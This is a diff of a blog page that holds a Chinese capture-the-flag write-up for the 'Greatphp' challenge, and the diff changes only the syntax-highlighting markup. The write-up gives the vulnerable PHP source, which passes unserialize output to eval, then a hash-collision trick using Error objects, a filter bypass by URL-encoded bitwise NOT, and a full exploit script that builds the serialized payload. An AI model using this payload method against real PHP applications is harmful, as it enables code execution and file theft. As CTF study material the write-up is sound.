@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      378 字
+      317 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      11
        分钟
     </span>
   
@@ -239,79 +247,79 @@
             
             <div class="markdown-body">
               <h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>给了源码</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;
-    <span class="hljs-keyword">public</span> $syc;
-    <span class="hljs-keyword">public</span> $lover;
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>
 
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
-        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;
-           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;
-               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);
-           &#125; <span class="hljs-keyword">else</span> &#123;
-               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);
-           &#125;
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token punctuation">&#125;</span>
            
-        &#125;
-    &#125;
-&#125;
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;
-    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);
-&#125; <span class="hljs-keyword">else</span> &#123;
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="token delimiter important">?></span></span></code></pre>
 
 <ul>
 <li>利用Error原生类绕过<code>md5</code>和<code>sha1</code>      </li>
 </ul>
 <p>本地测试</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">2</span>);
-<span class="hljs-keyword">echo</span> $a;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> $b;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-<span class="hljs-keyword">if</span>($a != $b)
-&#123;
-	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;
-&#125;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-<span class="hljs-keyword">if</span>(md5($a) === md5($b))
-&#123;
-	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5 success&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-&#125;
-<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1 success&quot;</span>;
-&#125;</code></pre></div>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"llnn"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"llnn"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">echo</span> <span class="token double-quoted-string string">"a!=b"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">echo</span> <span class="token double-quoted-string string">"md5 success"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"sha1 success"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
 
 <p>测试结果<br><code>$a = new Error(&quot;llnn&quot;,1);</code>和<code>$b = new Error(&quot;llnn&quot;,2);</code>不在一行的话<code>md5</code>和<code>sha1</code>是不等的 </p>
 <p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png" srcset="/img/loading.gif">      </p>
 <p>而且<code>llnn</code>那里，也就是Error类的第一个参数是可控的，所以可以这样：<code>?&gt;&lt;?=phpinfo();?&gt;</code>但有过滤，小括号和<code>/</code>都不能用，可以直接<code>include /flag</code>;将<code>/flag</code>url编码取反绕过</p>
-<div class="hljs"><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);
+<pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);
 %D0%99%93%9E%98
 php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);
-/flag</code></pre></div>
+/flag</code></pre>
 <p>payload：</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;
-	<span class="hljs-keyword">public</span> $syc;
-	<span class="hljs-keyword">public</span> $lover;
-&#125;
-$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);
-<span class="hljs-keyword">echo</span> $a.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
-$c = <span class="hljs-keyword">new</span> SYCLOVER();
-$c-&gt;syc = $a;
-$c-&gt;lover = $b;
-<span class="hljs-keyword">echo</span>(urlencode(serialize($c)));
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
+	<span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"?>&lt;?=include~"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"%D0%99%93%9E%98"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"?>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="token delimiter important">?></span></span></code></pre>
             </div>
             <hr>
             <div>
@@ -468,6 +476,8 @@ $c-&gt;lover = $b;
 
 
 
+  
+    
   
 
 
